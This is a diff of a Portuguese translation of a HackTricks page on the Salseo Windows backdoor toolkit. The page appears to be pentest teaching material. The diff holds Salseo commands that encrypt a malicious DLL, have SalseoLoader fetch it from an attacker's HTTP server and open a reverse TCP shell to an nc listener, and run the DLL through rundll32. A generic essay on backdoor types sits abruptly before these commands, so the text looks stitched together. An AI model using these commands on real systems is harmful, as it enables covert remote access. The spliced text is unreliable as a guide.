@@ -50,27 +50,27 @@ Uma maneira comum de criar um backdoor em um sistema Windows é adicionar uma en
 
 ## 2. Backdoors baseados em serviços
 
-Outra técnica comum é criar um backdoor como um serviço do Windows. Isso envolve a criação de um serviço que é executado em segundo plano e pode ser configurado para iniciar automaticamente quando o sistema é inicializado. O serviço pode ser configurado para executar um programa malicioso ou fornecer acesso remoto ao invasor.
+Outra técnica comum é criar um backdoor como um serviço do Windows. Isso envolve a criação de um serviço que é executado em segundo plano e pode ser configurado para iniciar automaticamente quando o sistema é inicializado. O serviço pode ser configurado para executar um programa malicioso ou fornecer um shell remoto para o invasor.
 
 ## 3. Backdoors baseados em arquivos DLL
 
-Os arquivos DLL (Dynamic Link Library) são componentes do sistema operacional Windows que contêm código e dados que podem ser usados por vários programas. Um backdoor pode ser criado substituindo uma DLL existente por uma versão modificada que inclui código malicioso. Quando um programa legítimo é executado e chama a função contida na DLL, o código malicioso também é executado.
+Os arquivos DLL (Dynamic Link Library) são componentes do sistema operacional Windows que contêm código e dados compartilhados por vários programas. Um backdoor pode ser criado substituindo uma DLL legítima por uma versão modificada que executa código malicioso. Quando um programa legítimo é executado e carrega a DLL modificada, o código malicioso é executado em segundo plano.
 
-## 4. Backdoors baseados em arquivos executáveis
+## 4. Backdoors baseados em drivers
 
-Outra técnica é modificar um arquivo executável existente para incluir código malicioso. Isso pode ser feito usando ferramentas de edição de binários para inserir o código malicioso no arquivo executável. Quando o arquivo é executado, o código malicioso também é executado.
+Os drivers são programas que permitem que o sistema operacional Windows se comunique com dispositivos de hardware. Um backdoor pode ser criado substituindo um driver legítimo por uma versão modificada que executa código malicioso. Quando o driver é carregado pelo sistema operacional, o código malicioso é executado em segundo plano.
 
-## 5. Backdoors baseados em scripts
+## 5. Backdoors baseados em aplicativos legítimos
 
-Os scripts, como arquivos batch (.bat) ou scripts PowerShell (.ps1), também podem ser usados para criar backdoors em sistemas Windows. Esses scripts podem ser configurados para executar comandos maliciosos ou fornecer acesso remoto ao invasor.
+Uma técnica menos comum é modificar um aplicativo legítimo para incluir um backdoor. Isso pode ser feito modificando o código do aplicativo ou injetando código malicioso em tempo de execução. Quando o aplicativo é executado, o backdoor é ativado e permite ao invasor obter acesso não autorizado ao sistema.
 
-## 6. Backdoors baseados em trojans
+## 6. Backdoors baseados em exploits
 
-Os trojans são programas maliciosos que se disfarçam como programas legítimos para enganar os usuários. Um backdoor pode ser criado incorporando um trojan em um arquivo ou programa aparentemente inofensivo. Quando o arquivo ou programa é executado, o trojan é ativado e permite o acesso remoto ao invasor.
+Os exploits são vulnerabilidades de segurança em sistemas operacionais ou aplicativos que podem ser exploradas para obter acesso não autorizado. Um backdoor pode ser criado aproveitando um exploit conhecido e explorando-o para obter acesso ao sistema. Isso geralmente requer conhecimento avançado de programação e segurança.
 
 ## Conclusão
 
-Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger efetivamente seus sistemas contra ataques de hackers.
+Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra ataques e garantir a segurança de seus dados.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -83,7 +83,7 @@ Ok, agora você tem tudo o que precisa para executar todo o processo de Salseo: 
 
 ### **Obtendo um shell reverso TCP (baixando o dll codificado por HTTP)**
 
-Lembre-se de iniciar um nc como ouvinte de shell reverso e um servidor HTTP para servir o evilsalsa codificado.
+Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor HTTP para servir o evilsalsa codificado.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -126,7 +126,7 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
@@ -172,7 +172,7 @@ Selecione a **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Com
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)
+Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, aparecerá o caminho da nova DLL)
 
 ### Teste a DLL gerada
 
@@ -220,7 +220,7 @@ rundll32.exe SalseoLoader.dll,main
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
